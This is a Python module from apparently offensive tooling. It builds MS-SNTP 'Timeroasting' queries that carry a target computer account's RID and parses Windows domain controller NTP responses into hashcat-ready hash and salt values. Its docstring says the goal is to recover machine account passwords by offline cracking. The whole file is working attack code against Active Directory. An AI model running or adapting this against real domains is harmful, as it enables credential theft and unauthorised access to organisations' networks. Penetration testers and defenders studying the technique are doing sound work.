"""MS-SNTP NTP packet construction and response parsing for Timeroasting.

Reference implementation: https://github.com/SecuraBV/Timeroast
Protocol: Windows NTP authenticator (RFC 1305 §D.4, MS-SNTP extension)

The DC signs NTP responses using HMAC-MD5 with the RC4 key (NT hash) of the
computer account whose RID is embedded in the request's KeyIdentifier field.
The signed response can be cracked offline to recover the machine account password.

Packet layout (68 bytes total response):
  [0:48]  NTP body (used as "salt" in hashcat format)
  [48:52] Key identifier = RID XOR key_flag (little-endian uint32)
  [52:68] HMAC-MD5 authenticator (16 bytes)
"""

from __future__ import annotations

from binascii import hexlify
from struct import pack, unpack

# Static NTP query prefix (48 bytes). Append 4-byte RID + 16-byte dummy MAC
# to form the full 68-byte query. From netexec timeroast / SecuraBV reference.
_NTP_PREFIX: bytes = bytes.fromhex(
    "db0011e9000000000001000000000000"
    "e1b8407debc7e506000000000000000000000000000000"
    "00e1b8428bffbfcd0a"
)

_NTP_RESPONSE_LEN = 68
_NTP_SALT_LEN = 48


def build_ntp_query(rid: int, *, old_password: bool = False) -> bytes:
    """Build a 68-byte NTP query embedding the target account's RID."""
    key_flag = 2**31 if old_password else 0
    key_id = pack("<I", rid ^ key_flag)
    return _NTP_PREFIX + key_id + b"\x00" * 16


def parse_ntp_response(
    data: bytes,
    *,
    old_password: bool = False,
) -> tuple[int, str, str] | None:
    """Parse a raw NTP response into (rid, hash_hex, salt_hex).

    Returns None if the packet is not a valid timeroast response.
    """
    if len(data) != _NTP_RESPONSE_LEN:
        return None

    key_flag = 2**31 if old_password else 0
    salt = data[:_NTP_SALT_LEN]
    rid = unpack("<I", data[_NTP_SALT_LEN:_NTP_SALT_LEN + 4])[0] ^ key_flag
    mac = data[_NTP_SALT_LEN + 4:]

    return rid, hexlify(mac).decode(), hexlify(salt).decode()
